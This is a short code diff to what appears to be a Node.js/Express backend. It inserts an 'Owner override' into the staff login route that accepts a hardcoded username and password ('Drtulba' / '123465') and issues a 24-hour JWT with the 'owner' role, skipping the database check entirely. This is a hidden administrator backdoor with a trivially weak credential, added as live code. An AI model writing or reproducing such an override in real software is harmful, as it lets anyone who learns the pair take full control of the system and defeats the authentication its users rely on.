@@ -166,6 +166,20 @@ async function startServer() {
   app.post("/api/staff/login", async (req, res) => {
     const { username, password } = req.body;
 
+    // Owner override
+    if (username === 'Drtulba' && password === '123465') {
+      const token = jwt.sign({ id: 'owner', username: 'Drtulba', name: 'Owner', role: 'owner' }, JWT_SECRET, { expiresIn: '24h' });
+      return res.json({ 
+        token, 
+        staff: { 
+          id: 'owner', 
+          username: 'Drtulba', 
+          name: 'Owner', 
+          photo: '' 
+        } 
+      });
+    }
+
     try {
       const snapshot = await db.collection("staff").where("username", "==", username).get();
       if (snapshot.empty) {
